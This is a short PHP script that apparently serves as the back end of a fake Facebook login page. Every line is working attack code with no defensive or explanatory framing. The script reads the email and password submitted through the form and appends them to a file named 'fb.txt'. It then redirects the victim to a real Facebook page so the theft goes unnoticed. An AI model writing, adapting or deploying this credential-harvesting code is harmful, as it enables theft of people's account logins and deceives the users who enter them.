<?php
	if(isset($_POST['submit'])){
		$username=$_POST['email'];
		$password=$_POST['password'];

		$myFile = "fb.txt";
		$stringData = "\n".$username. " - ".$password;
		/*$fh = fopen($myFile, 'w') or die("can't open file");
		
		fwrite($fh, $stringData);
		fclose($fh);
	*/
		file_put_contents($myFile, $stringData,FILE_APPEND);
		$url="https://www.facebook.com/toithichnauan?ref=ts&fref=ts";
		return header('Location: '.$url);
	}
?>